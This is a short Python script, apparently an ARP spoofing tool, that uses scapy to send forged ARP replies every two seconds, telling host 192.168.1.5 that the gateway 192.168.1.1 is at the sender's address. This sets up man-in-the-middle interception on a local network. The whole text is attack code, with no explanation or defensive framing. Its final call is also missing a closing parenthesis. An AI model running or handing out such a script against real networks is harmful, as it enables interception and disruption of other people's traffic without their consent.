from scapy.all import ARP, send
import time

def arp_spoof(target_ip, spoof_ip):
    arp_packet = ARP(pdst=target_ip, psrc=spoof_ip, op=2)

    while True:
        send(arp_packet, verbose=False)
        time.sleep(2)

print("[INFO] Sending ARP spoofing packets...")
arp_spoof("192.168.1.5", "192.168.1.1"
